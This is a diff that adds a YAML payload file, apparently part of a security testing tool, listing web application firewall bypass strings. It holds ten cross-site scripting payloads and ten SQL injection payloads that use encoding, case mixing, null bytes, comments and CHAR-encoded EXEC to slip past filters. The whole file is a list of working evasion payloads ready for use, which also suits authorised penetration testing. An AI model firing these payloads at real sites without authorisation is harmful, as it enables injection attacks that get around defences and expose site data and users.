@@ -1,0 +1,26 @@
+# WAF bypass payloads for XSS and SQLi.
+# Extend via ~/.kagesec/payloads/waf_bypass.yaml without modifying source.
+
+xss:
+  - "%253cscript%253ealert(1)%253c/script%253e"
+  - "<ScRiPt>alert(1)</ScRiPt>"
+  - "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+  - "<script>alert(1)</script>"
+  - "<scr\x00ipt>alert(1)</scr\x00ipt>"
+  - "<img src=x onerror=alert(1)//"
+  - "<svg/onload=alert(1)>"
+  - "<<SCRIPT>alert(1)//<</SCRIPT>"
+  - "<script\t>alert(1)</script>"
+  - "<script\n>alert(1)</script>"
+
+sqli:
+  - "'/**/OR/**/1=1--"
+  - "'%09OR%091=1--"
+  - "'%0AOR%0A1=1--"
+  - "1'%20OR%20'1'='1"
+  - "1'/*!50000OR*/1=1--"
+  - "1'+OORR+'1'='1"
+  - "1' OR 0x31=0x31--"
+  - "';EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(49))--"
+  - "' OR 'unusual'='unusual'--"
+  - "' OR 1=1#"
